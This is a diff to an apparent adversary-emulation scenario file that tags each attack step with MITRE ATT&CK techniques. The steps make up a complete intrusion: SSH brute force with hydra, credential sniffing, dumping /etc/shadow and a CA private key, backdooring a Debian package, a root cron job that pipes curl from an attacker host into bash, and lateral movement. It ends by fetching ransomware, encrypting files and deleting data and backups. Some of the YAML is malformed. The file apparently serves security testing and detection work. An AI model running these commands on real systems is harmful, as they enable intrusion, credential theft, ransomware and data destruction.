@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 3 c
 #
 ####################
 vars:
@@ -12,6 +12,10 @@ vars:
 commands:
   - type: shell
     cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+    metadata:
+      techniques: "T1078.002,T1110.001,T1133"
+      tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services"
 
   - type: ssh
     creates_session: foothold
@@ -20,11 +24,19 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078.002"
+      tactics: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
     cmd: "tcpdump -A port 21\n"
     interactive: True
+    metadata:
+      techniques: "T1040"
+      tactics: "Credential Access"
+      technique_name: "Network Sniffing"
 
   - type: sleep
     seconds: 20
@@ -39,11 +51,19 @@ commands:
     session: foothold
     cmd: "sudo -i\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactics: "Privilege Escalation"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
@@ -54,16 +74,27 @@ commands:
     session: foothold
     cmd: "cat /etc/shadow\n"
     interactive: True
+      techniques: "T1003.008"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
 
   - type: ssh
     session: foothold
     cmd: "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n"
     interactive: True
+    metadata:
+      techniques: "T1213"
+      tactics: "Collection"
+      technique_name: "Data from Information Repositories"
 
   - type: ssh
     session: foothold
     cmd: "cat /media/share/healthcheck_cron.sh\n"
     interactive: True
+    metadata:
+      techniques: "T1039"
+      tactics: "Collection"
+      technique_name: "Data from Network Shared Drive"
 
   - type: mktemp
     cmd: file
@@ -92,20 +123,23 @@ commands:
     background: True
     kill_on_exit: true
 
-#  - type: ssh
-#    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
-#    background: True
-#
-
   - type: ssh
     session: foothold
     cmd: "ls -l /var/www/html/debian\n"
     interactive: True
+    metadata:
+      techniques: "T1083"
+      tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
 
   - type: ssh
     cmd: "apt update && apt install -y dpkg-dev\n"
     session: foothold
     interactive: True
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: sleep
     seconds: 20
@@ -114,6 +148,10 @@ commands:
     session: foothold
     cmd: "mkdir /tmp/.tmux_data\n"
     interactive: True
+    metadata:
+      techniques: "T1036.005,T1564.001 "
+      tactics: "Defense Evasion"
+      technique_name: "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories "
 
   - type: ssh
     session: foothold
@@ -124,6 +162,10 @@ commands:
     session: foothold
     cmd: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n"
     interactive: True
+    metadata:
+      techniques: "T1574"
+      tactics: "Persistence,Defense Evasion"
+      technique_name: "Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -134,6 +176,11 @@ commands:
     session: foothold
     cmd: "vim DEBIAN/control\n"
     interactive: True
+    ## TODO
+    metadata:
+      techniques: "T1059,T1574"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -149,6 +196,10 @@ commands:
     session: foothold
     cmd: "vim DEBIAN/postinst\n"
     interactive: True
+    metadata:
+      techniques: "T1059,T1574"
+      tactics: "Persistence"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
 
   - type: ssh
     session: foothold
@@ -164,6 +215,10 @@ commands:
     session: foothold
     cmd: "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
     interactive: True
+    metadata:
+        techniques: "T1053.003,T1105,T1071.001 "
+        tactics: "Persistence,Command and Control"
+        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
 
   - type: ssh
     session: foothold
@@ -185,6 +240,10 @@ commands:
     session: foothold
     cmd: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n"
     interactive: True
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
 
   - type: ssh
     session: foothold
@@ -200,6 +259,11 @@ commands:
     session: foothold
     cmd: "dpkg-scanpackages . | gzip -c9  > Packages.gz\n"
     interactive: True
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
+
 
   - type: ssh
     cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
@@ -209,7 +273,6 @@ commands:
     jmp_hostname:  192.42.2.42
     clear_cache: True
     exit_on_error: False
-
 
 
 #################### MOVED ################################
@@ -228,31 +291,63 @@ commands:
   - type: msf-session
     session: movement
     cmd: curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry
+    metadata:
+      techniques: "T1486,T1105"
+      tactics: "Impact,Command and Control"
+      technique_name: "Data Encrypted for Impact, Ingress Tool Transfer"
 
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
+    metadata:
+      techniques: "T1486,T1565.001"
+      tactics: "Impact"
+      technique_name: "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"
 
   - type: msf-session
     session: movement
     cmd: find /media/data/Images
+    metadata:
+      techniques: "T1018"
+      tactics: "Discovery"
+      technique_name: "Remote System Discovery"
 
   - type: msf-session
     session: movement
     cmd: cat /etc/passwd
+    metadata:
+      techniques: "T1087.001"
+      tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
   
   - type: msf-session
     session: movement
     cmd: userdel -f john
+    metadata:
+      techniques: "T1531"
+      tactics: "Impact"
+      technique_name: "Account Access Removal"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
+    metadata:
+      techniques: "T1485"
+      tactics: "Impact
+      technique_name: "Data Destruction"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
-  
+    metadata:
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
+
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
+    metadata:
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
